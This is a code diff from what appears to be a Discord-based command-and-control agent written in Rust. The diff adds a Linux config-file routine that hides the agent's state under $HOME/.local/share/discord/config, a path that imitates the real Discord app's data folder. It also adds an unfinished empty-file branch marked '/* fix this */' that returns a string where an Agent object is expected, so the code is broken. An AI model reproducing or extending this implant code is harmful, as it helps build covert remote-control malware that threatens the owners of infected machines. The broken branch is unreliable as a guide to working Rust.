@@ -10,6 +10,7 @@ use std::{
     io::{Read, Write},
     path::Path,
 };
+use std::fs::create_dir_all;
 
 use serenity::{
     client::Context,
@@ -56,11 +57,20 @@ impl Agent {
             DiscordC2Error::from(err)
         })?;
 
-        // Deserialize the JSON data into an Agent object
-        let agent = serde_json::from_str(&config_data)
-            .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
+        /* fix this */
 
-        Ok(agent)
+        // if the contents of the agent file is blank, don't bother trying to deserialise because this is
+        // the initial agent creation
+        if !config_data.is_empty() {
+            // Deserialize the JSON data into an Agent object
+            let agent = serde_json::from_str(&config_data)
+                .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
+            Ok(agent)
+        } else {
+            // just return a blank string instead of erroring on EOF
+            let agent = &config_data;
+            Ok(agent)
+        }
     }
 
     fn write(&self) -> Result<(), DiscordC2Error> {
@@ -120,8 +130,8 @@ impl fmt::Display for Agent {
     }
 }
 
+// Helper method for getting the config file pointer for Windows
 #[cfg(windows)]
-// Helper method for getting the config file pointer
 fn get_config() -> Result<File, DiscordC2Error> {
     // Get all the config directory paths
     let app_data_dir =
@@ -138,6 +148,27 @@ fn get_config() -> Result<File, DiscordC2Error> {
         .map_err( |err| {
             DiscordC2Error::ConfigError(err.to_string())
         })?;
+
+    Ok(file)
+}
+
+// Helper method for getting the config file pointer for Linux
+#[cfg(not(windows))]
+fn get_config() -> Result<File, DiscordC2Error> {
+    // let's try to use the user's home directory $HOME/.local/share/discord/config
+    let home_dir = env::var("HOME").map_err(|err|DiscordC2Error::ConfigError(err.to_string()))?;
+    let config_dir = Path::new(&home_dir).join(".local/share/discord"); // dir
+    let config_file = Path::new(&config_dir).join("config"); // dir + file, so we don't create a dir named config
+
+    // if we can't even create the folders, don't try creating the file
+    create_dir_all(&config_dir).map_err(|err|DiscordC2Error::ConfigError(err.to_string()))?;
+
+    let file = OpenOptions::new()
+        .read(true)
+        .write(true)
+        .create(true)
+        .open(&config_file)
+        .map_err( |err| DiscordC2Error::ConfigError(err.to_string()))?;
 
     Ok(file)
 }
